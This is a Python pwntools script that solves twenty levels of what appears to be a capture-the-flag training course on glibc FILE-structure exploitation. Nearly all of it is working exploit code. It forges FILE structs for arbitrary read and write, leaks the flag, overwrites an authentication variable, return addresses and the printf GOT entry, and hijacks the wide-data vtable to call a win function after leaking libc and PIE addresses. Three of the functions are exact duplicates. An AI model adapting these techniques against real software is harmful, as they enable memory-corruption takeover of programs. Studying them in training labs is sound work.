from pwn import *
import os
import time
import re

CHALLENGE_NAME = f"/challenge/babyfile_level{os.getenv('HOSTNAME')[-2:]}"

# leak the flag using fwrite
def challenge1():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    flag_leak = 0x4040e0

    fp = FileStructure()
    payload = fp.write(flag_leak, 0x1E0)

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.send(payload)
        info(p.clean())

# 
def challenge2():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    authenticated = 0x4041F8
    fp = FileStructure()
    payload = fp.read(authenticated, 0x101)

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.send(payload)
        p.send(b'a'*0x101)
        info(p.clean())
        p.poll(block=True)
        # p.interactive()

def challenge3():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fileno_ = p8(4)

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.send(fileno_)
        info(p.clean())

def challenge4():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    win_addr = 0x401316
    fp = FileStructure()

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.readuntil(b' stored at: '))
        ret_addr = int(p.readlineb().strip().decode(), 16)
        payload = fp.read(ret_addr, 0x101)
        p.send(payload)
        p.send(p64(win_addr) + b'a'*0x101)
        info(p.clean())
        p.poll(block=True)

# flag read into memory, given stdout FILE*
def challenge5():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    flag = 0x4040c0
    fp = FileStructure()
    payload = fp.write(flag, 0x101)

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.send(payload)
        info(p.clean())
        p.poll(block=True)

# given stdin FILE*
def challenge6():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    authenticated = 0x4041F8

    fp = FileStructure()
    payload = fp.read(authenticated, 0x101)

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.send(payload)
        p.sendline(b'a'*0x101)
        info(p.clean())
        p.poll(block=True)


# todo
# change address of wide_data to be a pointer to win on the stack
# change address of vtable to IO_wfile_overflow
def challenge7():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()
    
    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # b *fwrite+189
    # c
    # finish
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.readuntil(b'within libc is: '))
        puts = int(p.readlineb().strip().decode(), 16)
        libc.address = puts - libc.symbols['puts']
        info(p.readuntil(b'located at: '))
        name_buf = int(p.readlineb().strip().decode(), 16)

        # set value of vtable to (_IO_wfile_jumps_maybe_mmap + 160)
        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
        # set _wide_data struct to point to (name_buf-0x68) that is set up
        fp._wide_data = (name_buf+8)-0xe0 
        # reset the lock value since it get clobbered
        fp._lock = name_buf + 496
        payload = bytes(fp)

        # 1. rax = rdi+offset (rax = the wide_data struct)
        # 2. rax = [rax+0xe0] (rax = the widedata vtable)
        # 3. call [rax+0x68] (calls win) 

        # 1. wide_data = (name_buf+8)
        # 2. (name_buf-0x68) = [(name_buf+8)-0xe0]
        # 3. call [(name_buf-0x68)+0x68]

        p.send(p64(0x4012E6) + p64(name_buf-0x68))
        p.send(payload)
        info(p.clean())
        p.poll(block=True)

def challenge8():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()

    win = 0x4012E6

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # b *fwrite+189
    # ''') as p:

    # need libc address 
    # need 

    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.readuntil(b'within libc is: '))
        puts = int(p.readlineb().strip().decode(), 16)
        libc.address = puts - libc.symbols['puts']
        info(p.readuntil(b'writing to: '))
        name_buf = int(p.readlineb().strip().decode(), 16) - 272 + 0x200
        

        # set value of vtable to (_IO_wfile_jumps_maybe_mmap + 160)
        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
        # set _wide_data struct to point to (name_buf-0x68) that is set up
        fp._wide_data = (name_buf+8)-0xe0 
        # reset the lock value since it get clobbered
        fp._lock = name_buf + 496
        payload = bytes(fp)

        # payload = fp; p64(0x00) = lock; p64(0x00) = padding; rest is addr of name_buf
        p.send(payload + p64(0x00) + p64(0x00) + p64(0x4012E6) + p64(name_buf-0x68))
        p.send(payload)
        print(hex(name_buf))
        info(p.clean())
        
        p.poll(block=True)

# vtable exploit on stdout
def challenge9():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()
    # not the actual win value but a bit into win because puts segfaults
    win = 0x40188B

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *challenge+142
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        # get the address of libc
        info(p.readuntil(b'within libc is: '))
        puts = int(p.readlineb().strip().decode(), 16)
        libc.address = puts - libc.symbols['puts']
        stdout = libc.symbols['_IO_2_1_stdout_']
        # set value of vtable to (_IO_wfile_jumps_maybe_mmap + 160)
        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
        # need wide_data to point to a pointer
        # that pointer should be 0xe0 before another pointer
        # that pointer should point to 0x68 before a pointer to WIN 
        fp._wide_data = stdout + 232 - 0xe0
        # reset the lock value since it get clobbered
        fp._lock = stdout + 4416
        payload = bytes(fp)
        # send payload + win + pointer-0x68 which points to win 
        p.send(payload + p64(win) + p64(stdout+224-0x68))
        info(p.clean())
        p.poll(block=True)

# vtable exploit with an argument check in win function
def challenge10():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()
    win = 0x4018E6

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # b *fwrite+189
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        # get the address of libc and where the fp will be
        info(p.readuntil(b'within libc is: '))
        puts = int(p.readlineb().strip().decode(), 16)
        libc.address = puts - libc.symbols['puts']
        info(p.readuntil(b'writing to: '))
        buf = int(p.readlineb().strip().decode(), 16)
        # set value of vtable to (_IO_wfile_jumps_maybe_mmap + 160)
        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
        # need wide_data to point to a pointer
        # that pointer should be 0xe0 before another pointer
        # that pointer should point to 0x68 before a pointer to WIN 
        fp._wide_data = buf + 232 - 0xe0
        # reset the lock value since it get clobbered
        fp._lock = buf + 4416
        # set the value of $rdi="password" when win gets called
        fp.flags = 0x64726f7773736170
        payload = bytes(fp)
        # send payload + win + pointer-0x68 which points to win 
        p.send(payload + p64(win) + p64(buf+224-0x68))
        info(p.clean())
        p.poll(block=True)

# getting familiar with the new interface
# reads the flag into memory, use fwrite to read the flag
def challenge11():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()
    flag_leak = 0x404100
    payload = fp.write(flag_leak, 0x1E0)

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # b *fwrite+189
    # ''') as p:


    with process([CHALLENGE_NAME], close_fds=False) as p:
        info(p.clean())
        p.sendline(b'new_note 100')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'write_file')
        info(p.clean())
        p.sendline(b'write_note')
        info(p.clean())
        p.poll(block=True)

# pie is on
# need to write to an authenticate variable to call win
def challenge12():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    authenticate_offset = 0x5170
    fp = FileStructure()

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fread@plt
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        # get the pie address of main
        info(p.readuntil(b'main is located at: '))
        main = int(p.readlineb().strip().decode(), 16)
        binary.address = main - binary.symbols['main']
        authenticated = binary.address + authenticate_offset
        # payload writes 2 a's to 'authenticated'
        payload = fp.read(authenticated, 2)
        p.sendline(b'new_note 0 1')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'read_file 0')
        p.send(b'a'*2)
        info(p.clean())
        p.sendline(b'authenticate')
        info(p.clean())
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# given a stack stack address as a leak
# 1. use the stack address to leak the return address
# 2. overwrite the return address with the address of win
def challenge13():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fread@plt
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        # get the location of the return address
        info(p.readuntil(b'writing to is: '))
        stack = int(p.readlineb().strip().decode(), 16)
        ret_addr = stack + 152
        # read what the return address is (main+201)
        payload = fp.write(ret_addr, 16)
        p.sendline(b'new_note 0 10')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.readuntil(b'fp);\n'))
        main = int.from_bytes(p.readlineb()[:6], "little") - 201
        binary.address = main - binary.symbols['main']
        win = p64(binary.symbols['win'])
        # overwrite the return address with the address of win
        fp = FileStructure()
        payload = fp.read(ret_addr, 16)
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'read_file 0')
        p.send(win + b'a'*(10-len(win)))
        info(p.clean())
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# same thing as 13 but you use fclose() to leak info
# 1. use fclose to write data, only partially overwrite the fp or it will segfault
# 2. use fread to overwrite the return address with win
def challenge14():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fread@plt
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:
        # get the location of the return address
        info(p.readuntil(b'writing to is: '))
        stack = int(p.readlineb().strip().decode(), 16)
        ret_addr = stack + 152
        # leak the return address
        p.sendline(b'new_note 0 10')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        # construct a payload
        fp.write(ret_addr, 100)
        fp.fileno = 2 # uses stderr instead of stdout
        payload = bytes(fp)[:0x74] # only give the bytes up to the fileno        
        p.send(payload)
        info(p.clean())
        p.sendline(b'close_file')
        # get the address of main
        main = int.from_bytes(p.readb()[1:8], "little") - 201
        info(p.clean())
        binary.address = main - binary.symbols['main']
        win = p64(binary.symbols['win'])
        # overwrite the return address with the address of win
        fp = FileStructure()
        payload = fp.read(ret_addr, 16)
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'read_file 0')
        p.send(win + b'a'*(10-len(win)))
        info(p.clean())
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# need to overwrite the got address of printf to be win
# pretty easy since pie is off
def challenge15():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fread@plt
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:        
        p.sendline(b'new_note 0 10')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        # write over the printf got address
        win = p64(binary.symbols['win'])
        payload = fp.read(binary.got.printf, 16)
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'read_file 0')
        p.send(win + b'a'*(10-len(win)))
        info(p.clean())
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)


# challenge reads the flag into memory
# can use the stdout file struct to print the flag
# just use the puts leak to overwrite the stdout file struct
def challenge16():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()
    flag = 0x405100

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b challenge
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:  
        # get the address of stdout file struct   
        info(p.readuntil(b'within libc is: '))
        puts = int(p.readlineb().strip().decode(), 16)
        libc.address = puts - libc.symbols['puts']
        stdout = libc.symbols['_IO_2_1_stdout_']
        # setup to overwrite the stdout file struct
        payload = fp.read(stdout, 116)
        info(p.clean())
        p.sendline(b'new_note 0 115')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'read_file 0')
        # overwrite the stdout file struct
        fp = FileStructure()
        payload = fp.write(flag, 116)
        p.send(payload)
        info(p.clean())
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)
        # file = 0x560df8c05310
        # flag = 0x560df8c054f0

# can open the flag but the fp is not saved
# just overwrite the fileno to get the contents into a note
# then write the flag to /tmp/babyfile.txt
def challenge17():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()
    # fp.flags = 0xfbad0000 & 0x0010

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fwrite@plt
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:  
        info(p.clean())
        p.sendline(b'new_note 0 100')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'open_flag')
        info(p.clean())
        p.sendline(b'write_fp')
        # change the fileno
        fp.flags = 0xfbad2480
        fp.fileno = 4 # fd of flag
        payload = bytes(fp)[:0x74] # only give the bytes up to the fileno
        p.send(payload)
        info(p.clean())
        # read the flag to note 0
        p.sendline(b'read_file 0')
        info(p.clean())
        # write the flag from note 0 to /tmp/babyfile.txt
        p.sendline(b'open_file')
        p.sendline(b'write_file 0')
        p.sendline(b'quit')
        info(p.clean())
        p.poll(block=True)

# need to do a vtable exploit to call win
# no leaks are provided
# need to leak the address of libc -> leak puts address since pie is off
# need to leak the address of fp -> pie is off and the address is in the bss
def challenge18():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fwrite@plt
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:  
        info(p.clean())
        # get the address of libc
        val = 0x405030
        payload = fp.write(val, 101)
        p.sendline(b'new_note 0 100')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.readuntil(b'fp);\n'))
        puts = int.from_bytes(p.readlineb()[:6], 'little')
        libc.address = puts - libc.symbols['puts']
        # get the address of fp
        val = 0x405228
        payload = fp.write(val, 101)
        p.sendline(b'new_note 0 100')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.readuntil(b'fp);\n'))
        buf = int.from_bytes(p.readlineb()[:6], 'little')
        # create a vtable fp and execute win
        fp = FileStructure()
        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
        fp._wide_data = buf + 232 - 0xe0
        fp._lock = buf + 4416
        payload = bytes(fp)
        p.sendline(b'write_fp')
        p.send(payload + p64(binary.symbols['win']) + p64(buf+224-0x68))
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.clean())
        p.poll(block=True)


def challenge19():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fwrite@plt
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:  
        info(p.clean())
        # get the address of libc
        val = 0x405030
        payload = fp.write(val, 101)
        p.sendline(b'new_note 0 100')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.readuntil(b'fp);\n'))
        puts = int.from_bytes(p.readlineb()[:6], 'little')
        libc.address = puts - libc.symbols['puts']
        # get the address of fp
        val = 0x405228
        payload = fp.write(val, 101)
        p.sendline(b'new_note 0 100')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.readuntil(b'fp);\n'))
        buf = int.from_bytes(p.readlineb()[:6], 'little')
        # create a vtable fp and execute win
        fp = FileStructure()
        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
        fp._wide_data = buf + 232 - 0xe0
        fp._lock = buf + 4416
        payload = bytes(fp)
        p.sendline(b'write_fp')
        p.send(payload + p64(binary.symbols['win']) + p64(buf+224-0x68))
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.clean())
        p.poll(block=True)


def challenge20():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(CHALLENGE_NAME)
    fp = FileStructure()

    # with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b fwrite@plt
    # c
    # ''') as p:

    with process([CHALLENGE_NAME], close_fds=False) as p:  
        info(p.clean())
        # get the address of libc
        val = 0x405030
        payload = fp.write(val, 101)
        p.sendline(b'new_note 0 100')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.readuntil(b'fp);\n'))
        puts = int.from_bytes(p.readlineb()[:6], 'little')
        libc.address = puts - libc.symbols['puts']
        # get the address of fp
        val = 0x405228
        payload = fp.write(val, 101)
        p.sendline(b'new_note 0 100')
        info(p.clean())
        p.sendline(b'open_file')
        info(p.clean())
        p.sendline(b'write_fp')
        p.send(payload)
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.readuntil(b'fp);\n'))
        buf = int.from_bytes(p.readlineb()[:6], 'little')
        # create a vtable fp and execute win
        fp = FileStructure()
        fp.vtable = (libc.symbols['_IO_file_jumps'] - 0x6c0) + 160
        fp._wide_data = buf + 232 - 0xe0
        fp._lock = buf + 4416
        payload = bytes(fp)
        p.sendline(b'write_fp')
        p.send(payload + p64(binary.symbols['win']) + p64(buf+224-0x68))
        info(p.clean())
        p.sendline(b'write_file 0')
        info(p.clean())
        p.poll(block=True)


def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge20()


if __name__ == "__main__":
    main()


    

# with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+693
    # b *main+432
    # ''') as p:
    

# core = Coredump('./core')
# print(core)


    